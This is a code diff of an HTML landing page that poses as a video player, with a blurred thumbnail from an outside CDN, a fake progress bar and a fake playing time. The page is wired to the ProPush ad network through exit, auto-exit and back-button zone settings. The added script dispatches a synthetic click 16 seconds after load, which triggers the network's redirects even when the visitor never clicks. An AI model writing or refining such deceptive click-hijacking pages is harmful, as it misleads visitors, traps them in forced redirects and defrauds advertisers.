@@ -1,170 +1,232 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-landing-name="player" data-version="custom-v1">
+
 <head>
-  <meta charset="UTF-8">
-  <meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0, user-scalable=no"
-  >
-  <title>Video Player</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Video Player</title>
 
-  <!-- ProPush CONFIG -->
-  <script>
-    var APP_CONFIG = {
-      domain: "https://jup9.com",
+<!-- ===== ProPush CONFIG ===== -->
+<script>
+var APP_CONFIG = {
+  domain: "https://jup9.com",
+  mainExit_currentTab_zoneId: 10474870,
+  mainExit_newTab_zoneId: 10474869,
+  reverse_zoneId: 10474868,
+  autoexit_zoneId: 10474871,
+  autoexit_timeToRedirect: 16,
+  back_zoneId: 10474872,
+  back_count: 10
+};
+</script>
 
-      mainExit_currentTab_zoneId: 10474870,
-      mainExit_newTab_zoneId: 10474869,
-      reverse_zoneId: 10474868,
+<link rel="stylesheet" href="./assets/styles/style.css">
+<script defer src="./assets/scripts/common.js"></script>
 
-      autoexit_zoneId: 10474871,
-      autoexit_timeToRedirect: 15,
+<style>
+body {
+  background:#000;
+  margin:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+  overflow:hidden;
+  font-family:-apple-system, Roboto, Helvetica, sans-serif;
+}
 
-      back_zoneId: 10474872,
-      back_count: 10
-    };
-  </script>
+/* PLAYER */
+.video-container {
+  position:relative;
+  width:100%;
+  max-width:900px;
+  aspect-ratio:16/9;
+  background:#000;
+  cursor:pointer;
+  overflow:hidden;
+}
 
-  <style>
-    body {
-      background-color: #000;
-      margin: 0;
-      padding: 0;
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      width: 100vw;
-      overflow: hidden;
-      color: #fff;
-    }
+/* FRAME */
+.xh-frame {
+  position:absolute;
+  inset:0;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  opacity:0;
+  filter:blur(15px) brightness(.6);
+  transition:opacity .6s ease, filter .6s ease;
+}
+.xh-frame.loaded {
+  opacity:1;
+  filter:blur(3px) brightness(.7);
+}
 
-    .video-container {
-      position: relative;
-      width: 100%;
-      max-width: 900px;
-      background: #000;
-      aspect-ratio: 16/9;
-      overflow: hidden;
-      cursor: pointer;
-    }
+/* CENTER PLAY */
+.central-play {
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  width:72px;
+  height:72px;
+  border-radius:50%;
+  background:rgba(0,0,0,.45);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:5;
+}
+.central-play::after {
+  content:'';
+  border-style:solid;
+  border-width:14px 0 14px 22px;
+  border-color:transparent transparent transparent #fff;
+  margin-left:4px;
+}
 
-    .xh-frame {
-      position: absolute;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      opacity: 0;
-      filter: blur(15px) brightness(0.6);
-      transition: filter .5s ease, opacity .8s ease;
-    }
+/* LOADER */
+.xh-loader {
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  width:44px;
+  height:44px;
+  border:4px solid rgba(255,255,255,.15);
+  border-top:4px solid #fff;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  z-index:6;
+}
+@keyframes spin {
+  to { transform:translate(-50%,-50%) rotate(360deg); }
+}
 
-    .xh-frame.loaded {
-      opacity: 1;
-      filter: blur(3px) brightness(.7);
-    }
+/* TOOLBAR */
+.player-interface {
+  position:absolute;
+  bottom:0;
+  left:0;
+  right:0;
+  height:64px;
+  background:linear-gradient(transparent, rgba(0,0,0,.9));
+  padding:10px;
+  z-index:4;
+}
 
-    .xh-loader {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      border: 4px solid rgba(255,255,255,.1);
-      border-top: 4px solid #fff;
-      border-radius: 50%;
-      width: 45px;
-      height: 45px;
-      animation: spin 1s linear infinite;
-      z-index: 30;
-    }
+/* PROGRESS */
+.progress-bar-bg {
+  height:4px;
+  background:rgba(255,255,255,.25);
+  position:relative;
+  margin-bottom:8px;
+}
+.progress-buffer {
+  position:absolute;
+  inset:0;
+  width:10%;
+  background:rgba(255,255,255,.5);
+  transition:width 16s linear;
+}
+.progress-play {
+  position:absolute;
+  inset:0;
+  width:6%;
+  background:#ff0000;
+}
+.progress-play::after {
+  content:'';
+  position:absolute;
+  right:-6px;
+  top:-4px;
+  width:12px;
+  height:12px;
+  background:#ff0000;
+  border-radius:50%;
+}
 
-    @keyframes spin {
-      to {
-        transform: translate(-50%, -50%) rotate(360deg);
-      }
-    }
-
-    .central-play {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 70px;
-      height: 70px;
-      background: rgba(255,255,255,.2);
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 20;
-    }
-
-    .central-play::after {
-      content: "";
-      border-style: solid;
-      border-width: 15px 0 15px 25px;
-      border-color: transparent transparent transparent #fff;
-      margin-left: 5px;
-    }
-  </style>
+/* CONTROLS */
+.controls {
+  display:flex;
+  align-items:center;
+  gap:14px;
+  font-size:12px;
+  color:#fff;
+}
+.play-btn {
+  width:0;
+  height:0;
+  border-top:7px solid transparent;
+  border-bottom:7px solid transparent;
+  border-left:11px solid #fff;
+}
+</style>
 </head>
 
 <body>
 
-  <div class="video-container xh-fake-player">
-    <img id="mainFrame" class="xh-frame" src="">
-    <div id="mainLoader" class="xh-loader"></div>
-    <div class="central-play"></div>
+<div class="video-container xh-fake-player">
+  <img class="xh-frame" id="mainFrame" alt="frame">
+  <div class="xh-loader" id="loader"></div>
+  <div class="central-play"></div>
+
+  <div class="player-interface">
+    <div class="progress-bar-bg">
+      <div class="progress-buffer" id="buffer"></div>
+      <div class="progress-play"></div>
+    </div>
+    <div class="controls">
+      <div class="play-btn"></div>
+      <span>0:07 / 14:32</span>
+      <span style="margin-left:auto;border:1px solid #fff;padding:0 4px;">HD</span>
+      <div style="width:14px;height:14px;border:2px solid #fff;"></div>
+    </div>
   </div>
+</div>
 
-  <script>
-    (function () {
-      const params = new URLSearchParams(location.search);
+<script>
+(function(){
+  const p = new URLSearchParams(location.search);
+  const cid = p.get("var_2");
+  const cr  = p.get("creative_id");
 
-      const cid = params.get("var_2");
-      const cr  = params.get("creative_id");
+  const frame  = document.getElementById("mainFrame");
+  const loader = document.getElementById("loader");
+  const buffer = document.getElementById("buffer");
 
-      const frame  = document.getElementById("mainFrame");
-      const loader = document.getElementById("mainLoader");
+  const CDN = "https://17534.igennos.store/frames";
 
-      const CDN_BASE = "https://17534.igennos.store/frames";
+  /* LOAD FRAME */
+  if (cid && cr && frame) {
+    const url = `${CDN}/${cid}/${cr}.webp`;
+    const img = new Image();
+    img.onload = () => {
+      frame.src = url;
+      frame.classList.add("loaded");
+      loader.style.display = "none";
+      buffer.style.width = "100%";
+    };
+    img.onerror = () => loader.remove();
+    img.src = url;
+  }
 
-      if (cid && cr && frame) {
-        const imgUrl = `${CDN_BASE}/${cid}/${cr}.webp`;
-        const img = new Image();
+  /* USER CLICK → ProPush */
+  document.querySelector(".xh-fake-player").addEventListener("click", () => {
+    document.body.dispatchEvent(
+      new MouseEvent("click", { bubbles:true, cancelable:true })
+    );
+  });
 
-        img.onload = () => {
-          frame.src = imgUrl;
-          frame.classList.add("loaded");
-          loader.style.display = "none";
-        };
+  /* AUTO CLICK @ 16s */
+  setTimeout(() => {
+    document.body.dispatchEvent(
+      new MouseEvent("click", { bubbles:true, cancelable:true })
+    );
+  }, 16000);
 
-        img.src = imgUrl;
-      }
-
-      /*
-        ❗ ВАЖНО:
-        НИКАКОГО window.location
-        НИКАКОГО z=
-        НИКАКОГО autoexit тут
-
-        Клик просто регистрируется,
-        дальше ProPush сам открывает exit
-      */
-
-      document
-        .querySelector(".xh-fake-player")
-        .addEventListener("click", () => {
-          // пусто — ProPush ловит событие сам
-        });
-
-    })();
-  </script>
-
-  <!-- ProPush CORE -->
-  <script defer src="./assets/scripts/common.js"></script>
+})();
+</script>
 
 </body>
 </html>
